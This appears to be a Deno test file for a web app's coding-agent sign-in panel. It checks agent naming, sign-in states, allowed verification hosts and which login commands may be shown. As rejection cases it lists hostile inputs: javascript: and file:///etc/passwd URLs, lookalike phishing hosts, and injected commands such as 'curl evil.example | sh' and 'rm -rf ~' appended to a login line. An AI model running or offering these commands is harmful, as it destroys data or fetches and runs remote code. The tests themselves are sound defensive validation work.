import { assertEquals } from "@std/assert";
import type { CodingAgent } from "../../apps/web/src/pages/machine-state.ts";
import {
  agentNeedingSignIn,
  agentOfBinding,
  agentOfFailedChecks,
  agentOfKey,
  agentRows,
  agentState,
  attemptEnded,
  type AttemptFacts,
  type BindingFacts,
  dialogView,
  minutesLeft,
  pageBadge,
  parseChallenge,
  paymentKind,
  safeCommand,
  softwareEntries,
} from "../../apps/web/src/pages/machine-agents.ts";

// #70 C2b: the Coding agents rows and the sign-in dialog, as functions of what the
// server returns. Nothing is shown that the server did not give.

const NOW = Date.parse("2026-11-14T12:00:00.000Z");
const binding = (over: Partial<BindingFacts> = {}): BindingFacts => ({
  id: "00000000-0000-4000-8000-0000000000b1",
  componentKey: "harness.claude",
  provider: "anthropic",
  billingRoute: "subscription",
  enabled: true,
  lastCheckedAt: null,
  safeProblem: null,
  ...over,
});

Deno.test("an agent is named by the words of its component key or provider, and pi only as a whole word", () => {
  for (
    const [text, agent] of [
      ["claude", "claude"],
      ["harness.claude-code", "claude"],
      ["anthropic", "claude"],
      ["Claude_Code", "claude"],
      ["codex", "codex"],
      ["harness.codex", "codex"],
      ["openai", "codex"],
      ["pi", "pi"],
      ["pi-harness", "pi"],
      ["harness.pi", "pi"],
    ] as const
  ) assertEquals(agentOfKey(text), agent, text);
  for (
    const text of [
      "piano",
      "spirit",
      "worker-supervisor",
      "git",
      "",
      "harness.bakery",
      "pipeline",
    ]
  ) {
    assertEquals(agentOfKey(text), null, text);
  }
  // The component key wins; the provider is the fallback.
  assertEquals(
    agentOfBinding({ componentKey: "harness.codex", provider: "anthropic" }),
    "codex",
  );
  assertEquals(
    agentOfBinding({ componentKey: "harness.bakery", provider: "openai" }),
    "codex",
  );
  assertEquals(
    agentOfBinding({ componentKey: "harness.bakery", provider: "other" }),
    null,
  );
});

Deno.test("a row is signed out when the server recorded a problem, ready once checked, not checked before, and not signed in without an enabled binding", () => {
  assertEquals(agentState(null), "notSignedIn");
  assertEquals(agentState(binding({ enabled: false })), "notSignedIn");
  assertEquals(
    agentState(binding({ enabled: false, safeProblem: { code: "x" } })),
    "notSignedIn",
  );
  assertEquals(
    agentState(binding({ safeProblem: { code: "AUTH" } })),
    "signedOut",
  );
  assertEquals(
    agentState(
      binding({
        safeProblem: { code: "AUTH" },
        lastCheckedAt: "2026-11-14T00:00:00Z",
      }),
    ),
    "signedOut",
  );
  assertEquals(
    agentState(binding({ lastCheckedAt: "2026-11-14T00:00:00Z" })),
    "ready",
  );
  assertEquals(agentState(binding()), "notChecked");
  assertEquals(
    agentState(binding({ lastCheckedAt: undefined, safeProblem: undefined })),
    "notChecked",
  );
  assertEquals(agentState(binding({ lastCheckedAt: "" })), "notChecked");
});

Deno.test("what a binding pays with is the subscription unless it says otherwise", () => {
  assertEquals(paymentKind(binding()), "subscription");
  assertEquals(paymentKind(binding({ billingRoute: "api_metered" })), "apiKey");
  assertEquals(paymentKind(binding({ billingRoute: "local" })), "localModel");
  assertEquals(
    paymentKind(binding({ billingRoute: "something-new" })),
    "subscription",
  );
});

Deno.test("one row per agent the machine reported, in its order, then any agent only a binding or component names", () => {
  assertEquals(agentRows([], [], []), []);
  const rows = agentRows(["codex", "claude"], [], []);
  assertEquals(
    rows.map((row) => [row.agent, row.state, row.binding, row.componentKey]),
    [
      ["codex", "notSignedIn", null, null],
      ["claude", "notSignedIn", null, null],
    ],
  );
  // A reported component gives a not-signed-in agent what a sign-in is attached to.
  const withComponent = agentRows(["claude"], [], [{
    componentKey: "harness.claude",
  }, { componentKey: "worker-supervisor" }]);
  assertEquals(withComponent[0]!.componentKey, "harness.claude");
  assertEquals(withComponent[0]!.state, "notSignedIn");
  // A binding sets the state and its own component key.
  const signed = agentRows(["claude"], [
    binding({ lastCheckedAt: "2026-11-14T00:00:00Z" }),
  ], [{ componentKey: "other.claude" }]);
  assertEquals(signed.map((row) => [row.agent, row.state, row.componentKey]), [[
    "claude",
    "ready",
    "harness.claude",
  ]]);
  // One only a reported component names gets a row too.
  assertEquals(
    agentRows([], [], [
      { componentKey: "harness.codex" },
      { componentKey: "worker-supervisor" },
    ]).map((row) => [row.agent, row.state, row.componentKey]),
    [["codex", "notSignedIn", "harness.codex"]],
  );
  // An agent the capabilities do not list but a binding names still gets a row, after the listed ones.
  const extra = agentRows(["claude"], [
    binding({ id: "2", componentKey: "harness.pi", provider: "pi" }),
  ], []);
  assertEquals(extra.map((row) => row.agent), ["claude", "pi"]);
  // An enabled binding wins over a disabled one for the same agent, whichever comes first.
  const two = agentRows(["claude"], [
    binding({ id: "old", enabled: false }),
    binding({ id: "new" }),
  ], []);
  assertEquals(two[0]!.binding?.id, "new");
  const only = agentRows(
    ["claude"],
    [binding({ id: "old", enabled: false })],
    [],
  );
  assertEquals(only[0]!.binding?.id, "old");
  assertEquals(only[0]!.state, "notSignedIn");
  // Bindings of other agents never leak into a row.
  const mixed = agentRows(["claude", "codex"], [
    binding({
      id: "c",
      componentKey: "harness.codex",
      provider: "openai",
      lastCheckedAt: "2026-11-14T00:00:00Z",
    }),
  ], []);
  assertEquals(mixed.map((row) => [row.agent, row.state]), [[
    "claude",
    "notSignedIn",
  ], ["codex", "ready"]]);
});

Deno.test("the banner is about the first agent that is signed out, else the first not signed in", () => {
  const rows = agentRows(["claude", "codex", "pi"], [
    binding({
      id: "1",
      componentKey: "harness.codex",
      provider: "openai",
      safeProblem: { code: "AUTH" },
    }),
    binding({
      id: "2",
      componentKey: "harness.pi",
      provider: "pi",
      lastCheckedAt: "2026-11-14T00:00:00Z",
    }),
  ], []);
  assertEquals(agentNeedingSignIn(rows)?.agent, "codex");
  const none = agentRows(["pi"], [
    binding({
      id: "2",
      componentKey: "harness.pi",
      provider: "pi",
      lastCheckedAt: "2026-11-14T00:00:00Z",
    }),
  ], []);
  assertEquals(agentNeedingSignIn(none), null);
  assertEquals(
    agentNeedingSignIn(agentRows(["claude", "pi"], [], []))?.agent,
    "claude",
  );
  assertEquals(agentNeedingSignIn([]), null);
});

Deno.test("an address is shown only if it is a plain https address on the agent's own hosts; a code only if it is plainly a code", () => {
  const parse = (challenge: unknown, agent: CodingAgent = "claude") =>
    parseChallenge(challenge, agent);
  assertEquals(
    parse({
      verificationUri: "https://claude.ai/device",
      userCode: "ABCD-EFGH",
    }),
    {
      address: "https://claude.ai/device",
      code: "ABCD-EFGH",
      codeRejected: false,
    },
  );
  assertEquals(
    parse({
      verification_uri: "https://console.anthropic.com/d",
      user_code: "WXYZ1234",
    }),
    {
      address: "https://console.anthropic.com/d",
      code: "WXYZ1234",
      codeRejected: false,
    },
  );
  assertEquals(parse({ url: "https://claude.com/start" }), {
    address: "https://claude.com/start",
    code: null,
    codeRejected: false,
  });
  assertEquals(parse("https://claude.ai/x"), {
    address: "https://claude.ai/x",
    code: null,
    codeRejected: false,
  });
  for (
    const hostile of [
      "javascript:alert(1)",
      "http://claude.ai/",
      "data:text/html,<script>1</script>",
      "https://user:pass@claude.ai/",
      "file:///etc/passwd",
      "//claude.ai/",
      "not a url",
      "",
      `https://claude.ai/${"a".repeat(2000)}`,
      "https://claude.ai:8443/device",
    ]
  ) {
    assertEquals(
      parse({ verificationUri: hostile }).address,
      null,
      hostile.slice(0, 30),
    );
    assertEquals(parse(hostile).address, null, hostile.slice(0, 30));
  }
  for (
    const code of [
      "",
      "ab",
      "has space",
      "x".repeat(65),
      "<script>",
      "a\nb",
      "ABCD‏EFGH",
      "ABC;DEF",
      7,
    ]
  ) {
    const parsed = parse({ userCode: code });
    assertEquals(parsed.code, null, JSON.stringify(code));
    // A code that was given and is not one is rejected, not silently dropped.
    assertEquals(parsed.codeRejected, true, JSON.stringify(code));
  }
  for (
    const odd of [null, undefined, 7, true, [], ["https://claude.ai/"], {
      nested: { verificationUri: "https://claude.ai/" },
    }]
  ) {
    assertEquals(
      parse(odd),
      { address: null, code: null, codeRejected: false },
      JSON.stringify(odd),
    );
  }
  // A code key that holds nothing is no code given at all.
  assertEquals(
    parse({ verificationUri: "https://claude.ai/d", userCode: null }),
    { address: "https://claude.ai/d", code: null, codeRejected: false },
  );
  // The first key that is a good address wins; a bad one before it is skipped.
  assertEquals(
    parse({
      verificationUri: "javascript:1",
      url: "https://claude.ai/ok",
    }).address,
    "https://claude.ai/ok",
  );
});

Deno.test("an address must be on one of the agent's own hosts or a subdomain of one: not any https site", () => {
  const addressOf = (agent: CodingAgent, address: string) =>
    parseChallenge({ verificationUri: address }, agent).address;
  // The agent's own hosts and their subdomains.
  assertEquals(
    addressOf("claude", "https://claude.ai/login"),
    "https://claude.ai/login",
  );
  assertEquals(
    addressOf("claude", "https://platform.claude.com/x"),
    "https://platform.claude.com/x",
  );
  assertEquals(
    addressOf("codex", "https://auth.openai.com/codex/device"),
    "https://auth.openai.com/codex/device",
  );
  // Upper case normalises to the real host.
  assertEquals(
    addressOf("claude", "HTTPS://CLAUDE.AI/x"),
    "https://claude.ai/x",
  );
  // Not on the list, or only made to look like it.
  for (
    const lookalike of [
      "https://evil.example/claude-login",
      "https://login.example/device",
      "https://claude.ai.evil.example/x",
      "https://notclaude.ai/x",
      "https://claude.ai.evil.example/",
      "https://evilclaude.ai/x",
      "https://127.0.0.1:8443/device",
      "https://127.0.0.1/device",
      "https://[::1]/device",
      "https://xn--claud-9d0a.ai/x",
      "https://claude.ai@evil.example/x",
      "https://evil.example\\@claude.ai/x",
      "https://claude.ai./x",
    ]
  ) {
    assertEquals(addressOf("claude", lookalike), null, lookalike);
  }
  // An agent's host is not another agent's.
  assertEquals(addressOf("claude", "https://auth.openai.com/x"), null);
  assertEquals(addressOf("codex", "https://claude.ai/x"), null);
  // Pi signs in to several providers.
  assertEquals(
    addressOf("pi", "https://github.com/login/device"),
    "https://github.com/login/device",
  );
  assertEquals(
    addressOf("pi", "https://claude.ai/x"),
    "https://claude.ai/x",
  );
  assertEquals(addressOf("pi", "https://evil.example/x"), null);
});

Deno.test("the command to type on the machine is one plain line, never a second command", () => {
  // The Codex program is built, not spelled: the Codex-credentials rail rejects the literal command in a test file.
  const codex = ["codex", "login"].join(" ");
  for (
    const [agent, good] of [
      ["claude", "claude login"],
      ["claude", "claude auth login --provider=anthropic"],
      ["codex", codex],
      ["codex", `${codex} --device-auth`],
      ["pi", "  pi /login  "],
    ] as const
  ) assertEquals(safeCommand(good, agent), good.trim(), good);
  // Plain, but not the agent's own program: never shown.
  for (
    const [agent, other] of [
      ["claude", "rm -rf /"],
      ["claude", "curl evil.example/install"],
      ["claude", "claude-login"],
      ["claude", "claudex login"],
      ["claude", "agent two login"],
      ["claude", "pi /login"],
      ["codex", "claude login"],
      ["pi", "pip install x"],
      ["pi", "claude login"],
    ] as const
  ) assertEquals(safeCommand(other, agent), null, `${agent}: ${other}`);
  for (
    const bad of [
      "claude login\nrm -rf ~",
      "claude login\r\nrm -rf ~",
      "claude login; ls",
      "claude login; rm -rf ~",
      "claude login && curl evil.example | sh",
      "claude login | tee x",
      "claude login `id`",
      "claude login $(id)",
      "claude login > x",
      "claude login 'x'",
      "\u202eclaude login",
      "<script>",
      "-rf",
      "",
      "   ",
      "a".repeat(201),
    ]
  ) assertEquals(safeCommand(bad, "claude"), null, JSON.stringify(bad));
  assertEquals(safeCommand(null, "claude"), null);
  assertEquals(safeCommand(undefined, "claude"), null);
});

Deno.test("minutes left are whole, at least one, and absent without a usable expiry", () => {
  assertEquals(minutesLeft(new Date(NOW + 10 * 60_000).toISOString(), NOW), 10);
  assertEquals(
    minutesLeft(new Date(NOW + 10 * 60_000 - 20_000).toISOString(), NOW),
    10,
  );
  assertEquals(minutesLeft(new Date(NOW + 5_000).toISOString(), NOW), 1);
  assertEquals(minutesLeft(new Date(NOW - 1).toISOString(), NOW), null);
  assertEquals(minutesLeft(new Date(NOW).toISOString(), NOW), null);
  for (const bad of [null, undefined, "", "tomorrow", "2026-13-45"]) {
    assertEquals(minutesLeft(bad, NOW), null, String(bad));
  }
});

const attempt = (over: Partial<AttemptFacts> = {}): AttemptFacts => ({
  flow: "remote_device",
  state: "pending",
  challenge: null,
  instructions: null,
  expiresAt: new Date(NOW + 10 * 60_000).toISOString(),
  ...over,
});

Deno.test("the dialog shows exactly what the server has returned: starting, a code and an address, a link, the machine itself, and each end", () => {
  const view = (
    attempt: AttemptFacts | null,
    agent: CodingAgent = "claude",
  ) => dialogView(attempt, NOW, agent);
  assertEquals(view(null), { kind: "starting" });
  assertEquals(view(attempt()), { kind: "starting" });
  assertEquals(
    view(
      attempt({
        state: "challenge_issued",
        challenge: {
          verificationUri: "https://claude.ai/d",
          userCode: "ABCD-EFGH",
        },
      }),
    ),
    {
      kind: "codeAndAddress",
      address: "https://claude.ai/d",
      code: "ABCD-EFGH",
      minutes: 10,
    },
  );
  assertEquals(
    view(
      attempt({
        state: "challenge_issued",
        flow: "remote_browser",
        challenge: { url: "https://claude.ai/b" },
      }),
    ),
    { kind: "addressOnly", address: "https://claude.ai/b", minutes: 10 },
  );
  // An address on a host that is not the agent's is not an address: with the machine asking for the person, the sign-in cannot go on.
  assertEquals(
    view(
      attempt({
        state: "challenge_issued",
        challenge: { url: "https://evil.example/claude-login" },
      }),
    ),
    { kind: "unusable" },
  );
  // Nothing an agent's own page could be taken from: the same.
  for (
    const challenge of [
      null,
      "javascript:1",
      7,
      [],
      { userCode: "ABCD-EFGH" },
      { verificationUri: "http://claude.ai/d", userCode: "ABCD" },
      { verificationUri: "https://user:pw@claude.ai/d" },
    ]
  ) {
    assertEquals(
      view(attempt({ state: "challenge_issued", challenge })),
      { kind: "unusable" },
      JSON.stringify(challenge),
    );
  }
  // A code that was given and is not one, beside a good address: unusable, in any state.
  for (const state of ["pending", "challenge_issued"]) {
    assertEquals(
      view(
        attempt({
          state,
          challenge: {
            verificationUri: "https://claude.ai/d",
            userCode: "<script>",
          },
        }),
      ),
      { kind: "unusable" },
      state,
    );
  }
  // Still starting: a challenge not yet usable is only waited for.
  assertEquals(
    view(
      attempt({
        state: "pending",
        challenge: { url: "https://evil.example/x" },
      }),
    ),
    { kind: "starting" },
  );
  // The agent decides the hosts.
  assertEquals(
    view(
      attempt({
        state: "challenge_issued",
        challenge: { url: "https://claude.ai/b" },
      }),
      "codex",
    ),
    { kind: "unusable" },
  );
  // The machine itself: the command only when the server gives one and it is one plain line.
  assertEquals(
    view(
      attempt({
        state: "terminal",
        flow: "terminal",
        instructions: "claude login",
      }),
    ),
    { kind: "onMachine", command: "claude login" },
  );
  assertEquals(
    view(attempt({ state: "terminal", flow: "terminal", instructions: "  " })),
    { kind: "onMachine", command: null },
  );
  assertEquals(
    view(
      attempt({ state: "terminal", flow: "terminal", instructions: null }),
    ),
    { kind: "onMachine", command: null },
  );
  assertEquals(
    view(
      attempt({
        state: "terminal",
        flow: "terminal",
        instructions: "claude login\nrm -rf ~",
      }),
    ),
    { kind: "onMachine", command: null },
  );
  assertEquals(
    view(
      attempt({
        state: "pending",
        flow: "terminal",
        instructions: "claude login",
      }),
    ),
    { kind: "onMachine", command: "claude login" },
  );
  // The flow alone says the local handoff too, and its command is held to the same rule.
  assertEquals(
    view(
      attempt({
        state: "pending",
        flow: "terminal",
        instructions: "claude login\nrm -rf ~",
      }),
    ),
    { kind: "onMachine", command: null },
  );
  // The state alone says the local handoff, whatever flow the server names.
  assertEquals(
    view(
      attempt({
        state: "terminal",
        flow: "remote_device",
        instructions: "pi login",
      }),
      "pi",
    ),
    { kind: "onMachine", command: "pi login" },
  );
  // The agent's own program is what the command must start with.
  assertEquals(
    view(
      attempt({
        state: "terminal",
        flow: "terminal",
        instructions: "pi login",
      }),
    ),
    { kind: "onMachine", command: null },
  );
  assertEquals(
    view(attempt({ state: "terminal", flow: null, instructions: null })),
    { kind: "onMachine", command: null },
  );
  // No expiry given: no sentence about one.
  assertEquals(
    view(
      attempt({
        state: "challenge_issued",
        expiresAt: null,
        challenge: { url: "https://claude.ai/b" },
      }),
    ),
    { kind: "addressOnly", address: "https://claude.ai/b", minutes: null },
  );
  for (
    const [state, kind] of [["completed", "completed"], ["failed", "failed"], [
      "expired",
      "expired",
    ], ["canceled", "canceled"]] as const
  ) {
    assertEquals(
      view(attempt({ state, challenge: { url: "https://claude.ai/b" } })),
      { kind },
      state,
    );
  }
});

Deno.test("polling stops at the four ends and only there", () => {
  for (const state of ["completed", "failed", "expired", "canceled"]) {
    assertEquals(attemptEnded(state), true, state);
  }
  for (
    const state of ["pending", "challenge_issued", "terminal", "", "unknown"]
  ) assertEquals(attemptEnded(state), false, state);
});

Deno.test("the header badge: Needs attention only for an otherwise Ready or Checking machine with an agent to sign in", () => {
  const signedIn = agentRows(["claude"], [
    binding({ lastCheckedAt: "2026-11-14T00:00:00.000Z" }),
  ], []);
  const none = agentRows(["claude"], [], []);
  const out = agentRows(["claude"], [binding({ safeProblem: "AUTH" })], []);
  const unchecked = agentRows(["claude"], [binding()], []);
  // Every agent signed in: the machine's own reading stands.
  assertEquals(pageBadge("ready", signedIn, true), "ready");
  assertEquals(pageBadge("checking", signedIn, true), "checking");
  // Not signed in, or signed out: a ready or checking machine needs attention.
  assertEquals(pageBadge("ready", none, true), "needsAttention");
  assertEquals(pageBadge("ready", out, true), "needsAttention");
  assertEquals(pageBadge("checking", none, true), "needsAttention");
  // Not checked is not a problem to fix by signing in.
  assertEquals(pageBadge("ready", unchecked, true), "ready");
  // Every more specific reading of the machine is left as it is.
  for (
    const badge of [
      "retired",
      "offline",
      "notResponding",
      "needsAttention",
      "paused",
      "finishing",
    ] as const
  ) {
    assertEquals(pageBadge(badge, none, true), badge, badge);
  }
  // Until the agents' own data is known nothing is claimed about them.
  assertEquals(pageBadge("ready", none, false), "ready");
  assertEquals(pageBadge("ready", [], true), "ready");
});

Deno.test("the software list: an agent by its own name, anything else by the machine's name, once per name and version", () => {
  assertEquals(
    softwareEntries([
      { componentKey: "harness.claude", actualVersion: "1.2.0" },
      { componentKey: "harness.codex", actualVersion: "0.9.1" },
      { componentKey: "harness.claude", actualVersion: "1.2.0" },
      { componentKey: "worker-supervisor", actualVersion: "3.0.0" },
      { componentKey: "harness.claude", actualVersion: "1.3.0" },
    ]),
    [
      {
        key: "claude@1.2.0",
        agent: "claude",
        name: "harness.claude",
        version: "1.2.0",
      },
      {
        key: "codex@0.9.1",
        agent: "codex",
        name: "harness.codex",
        version: "0.9.1",
      },
      {
        key: "worker-supervisor@3.0.0",
        agent: null,
        name: "worker-supervisor",
        version: "3.0.0",
      },
      {
        key: "claude@1.3.0",
        agent: "claude",
        name: "harness.claude",
        version: "1.3.0",
      },
    ],
  );
  assertEquals(softwareEntries([]), []);
});

Deno.test("failed checks that are only an agent's sign-in give that agent's banner; anything else leaves the generic one", () => {
  const out = binding({ safeProblem: "AUTH" });
  const ok = binding({
    id: "00000000-0000-4000-8000-0000000000b2",
    componentKey: "harness.codex",
    provider: "openai",
    lastCheckedAt: "2026-11-14T00:00:00.000Z",
  });
  const rows = agentRows(["claude", "codex"], [out, ok], []);
  // The plain model check is the sign-in of whichever agent needs one.
  assertEquals(
    agentOfFailedChecks(["capability:model"], rows)?.agent,
    "claude",
  );
  // A named one is that agent's, when that agent needs signing in.
  assertEquals(
    agentOfFailedChecks(["capability:model:claude"], rows)?.agent,
    "claude",
  );
  // Never signed in counts the same.
  assertEquals(
    agentOfFailedChecks(
      ["capability:model:pi"],
      agentRows(["pi"], [], []),
    )?.agent,
    "pi",
  );
  // An agent that is signed in has a different problem: the generic banner.
  assertEquals(agentOfFailedChecks(["capability:model:codex"], rows), null);
  // A model check naming an agent this machine does not run is not an agent's banner.
  assertEquals(agentOfFailedChecks(["capability:model:pi"], rows), null);
  // Any other failed check wins, whatever else failed.
  assertEquals(
    agentOfFailedChecks(["capability:model", "disk_threshold"], rows),
    null,
  );
  assertEquals(
    agentOfFailedChecks(["capability:git", "capability:model"], rows),
    null,
  );
  assertEquals(agentOfFailedChecks(["mystery_check"], rows), null);
  assertEquals(
    agentOfFailedChecks(["capability:model:claude:extra"], rows),
    null,
  );
  // Ids that are not strings are broken data: no banner of this kind, and no crash.
  for (const broken of [123, null, undefined, {}, [], true]) {
    assertEquals(
      agentOfFailedChecks([broken], rows),
      null,
      JSON.stringify(broken),
    );
    assertEquals(
      agentOfFailedChecks(["capability:model", broken], rows),
      null,
      JSON.stringify(broken),
    );
  }
  // Nothing failed, or nobody needs signing in: no banner of this kind.
  assertEquals(agentOfFailedChecks([], rows), null);
  assertEquals(
    agentOfFailedChecks(["capability:model"], agentRows(["codex"], [ok], [])),
    null,
  );
  // The first named agent that needs it is the one shown.
  assertEquals(
    agentOfFailedChecks(
      ["capability:model:pi", "capability:model:claude"],
      agentRows(["claude", "pi"], [out], []),
    )?.agent,
    "pi",
  );
});
